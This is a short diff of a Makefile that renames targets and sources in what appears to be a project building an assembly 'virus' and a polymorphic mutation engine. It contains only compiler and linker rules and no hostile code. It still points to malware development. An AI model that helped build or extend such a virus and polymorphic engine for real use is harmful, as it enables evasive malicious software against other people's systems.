@@ -8,19 +8,19 @@ CFLAGS = -c -Wall -O2 -g
 
 LFLAGS = -no-pie
 
-all: virus polyengine
+all: virus polymake
 
-polyengine: polyengine.o morphengine.o
+polymake: polyengine.o polymorphicengine.o
 	$(CC) $(LFLAGS) $^ -o $@
 	
 virus: virus.o
 	$(CC) $(LFLAGS) $< -o $@
 
-virus.o: virus.asm turnpoly.inc
+virus.o: virus.asm template.asm.inc
 	$(ASM) $(AFLAGS) $< -o $@
 
-polyengine.o: polyengine.cpp
+polyengine.o: polymake.cpp
 	$(CC) $(CFLAGS) $< -o $@
 
-morphengine.o: morphengine.asm
+polymorphicengine.o: polymorphicengine.asm
 	$(ASM) $(AFLAGS) $< -o $@
